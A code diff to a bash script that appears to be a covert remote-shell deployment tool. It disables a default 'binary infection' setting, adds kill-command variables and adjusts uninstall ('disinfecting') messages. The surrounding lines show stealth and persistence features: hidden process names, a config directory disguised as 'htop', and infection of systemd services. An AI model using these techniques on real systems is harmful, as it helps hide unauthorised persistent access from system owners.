@@ -152,7 +152,7 @@ PROC_HIDDEN_NAME_RX="${PROC_HIDDEN_NAME_RX:1}"
 # ~/.config/<NAME>
 CONFIG_DIR_NAME="htop"
 
-GS_INFECT=1
+# GS_INFECT=1 # 2024-04-20 YANKED until bugfix
 [[ -n $GS_NOINFECT ]] && unset GS_INFECT
 
 # systemd candidates for binary infection
@@ -786,15 +786,18 @@ init_vars()
 		# they match the binary name.
 		WARN "OSX is least supported. GS_UNDO= may not work. Check manually"
 		KL_CMD="killall"
+		KL_CMD_TERM="killall"
 		IS_KILL_ON_ARGV0=1
 		KL_NAME="${PROC_HIDDEN_NAME}"
 		KL_CMD_RUNCHK_UARG=("-0" "-u${USER}")
 	elif command -v pkill >/dev/null; then
 		KL_CMD="pkill"
+		KL_CMD_TERM="pkill -x"
 		KL_NAME="${BIN_HIDDEN_NAME_RX}"
 		KL_CMD_RUNCHK_UARG=("-x" "-0" "-U${UID}")
 	elif command -v killall >/dev/null; then
 		KL_CMD="killall"
+		KL_CMD_TERM="killall"
 		KL_NAME="${BIN_HIDDEN_NAME}"
 		# cygwin's killall needs the name (not the uid)
 		KL_CMD_RUNCHK_UARG=("-0" "-u${USER}")
@@ -1003,7 +1006,7 @@ uninstall_service()
 
 	[[ ! -f "${sf}" ]] && return
 	[[ $UID -ne 0 ]] && {
-		echo "${CDY}WARN${CN}: Disinfecting ${fn}...FAILED. Need to be root."
+		echo -e "${CDY}WARN${CN}: Disinfecting ${fn}...FAILED. Need to be root."
 		return 255
 	}
 
@@ -1024,7 +1027,7 @@ uninstall_systemd_infect() {
 	
 	[[ ! -f "${fn} " ]] && return 0
 	[[ $UID -ne 0 ]] && {
-		echo "${CDY}WARN${CN}: Disinfecting ${fn}...FAILED. Need to be root."
+		echo -e "${CDY}WARN${CN}: Disinfecting ${fn}...FAILED. Need to be root."
 		return 255
 	}
 
@@ -1112,7 +1115,7 @@ uninstall()
 		echo -n "pkill -x '(${PROC_HIDDEN_NAME_RX})';"
 	else
 		for x in "${cmd_kill_arr[@]}"; do
-			echo -n "${KL_CMD:-pkill} '$x';"
+			echo -n "${KL_CMD_TERM:-pkill -x} '$x';"
 		done
 	fi
 	echo -e "${systemd_kill_cmd}${CN} to terminate all running shells."
@@ -1405,9 +1408,6 @@ install_system_systemd()
 	# 1. offline
 	# 2. >&2 Failed to get D-Bus connection: Operation not permitted <-- Inside docker
 	[[ "$(systemctl is-system-running 2>/dev/null)" =~ (offline|^$) ]] && return 255
-
-	# printf "%-70.70s" "Infecting systemd service....................................................................."
-	# SKIP_OUT "GS_NOINFECT=1 is set"
 
 	if [[ -n $GS_INFECT ]]; then
 		i=0
